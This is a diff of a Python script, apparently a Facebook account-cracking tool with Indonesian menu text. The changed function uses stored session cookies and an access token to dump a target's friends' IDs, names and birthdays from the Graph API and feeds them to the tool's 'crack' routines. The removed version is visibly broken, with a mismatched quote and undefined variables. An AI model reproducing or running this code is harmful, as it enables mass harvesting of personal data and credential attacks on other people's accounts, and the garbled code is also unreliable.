@@ -237,30 +237,22 @@ def menu(id):
 		baz_anim(f'{puti}└──{mer} input publik atau file')
 
 ###----------[ DUMP ID PUBLIK ]----------###
-def nge_krek():
-	try:
-		cok = open('.cookiesakun.txt','r').read()
-	except IOError:
-		os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
-		baz_anim(f'└──{mer} cookies telah kadaluarsa ster')
-		exit()
-	print(f'{xxx}─────────────────────────────')
-	idnyanih = input(f'└── id : ')
-	try:
-		ambilid = requests.get('https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
-		for proses in ambilid['friends']['data']:
-			try:id.append(proses['id']+'|'+proses['name'])
-			except:continue
-		print(f'└── terkumpul : '+str(len(id)))
-		atur_dulu()
-	except requests.exceptions.ConnectionError:
-		baz_anim(f'{puti}└──{mer} koneksi terputus')
-		exit()
-	except (KeyError,IOError):
-		baz_anim(f'{puti}└──{mer} teman tidak publik')
-		baz_anim(f'{puti}└──{mer} ganti id target nya')
-		waktu(1)
-		nge_krek()
+def nge_krek1():
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+		a = input('>> masukan id target: ')
+		try:
+			params = {
+			"access_token": token, 
+			"fields": "name,friends.fields(id,name,birthday)"
+			}
+			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
+			for c in b["friends"]["data"]:
+				id.append(c["id"]+"|"+c["name"])
+			print('>> Total Idz : {}'.format(len(id)));setting()
+		except Exception as e:
+			print(e)
+			nge_crack()
 
 ###----------[ CRACK  FILE ]----------###
 def file_dump():
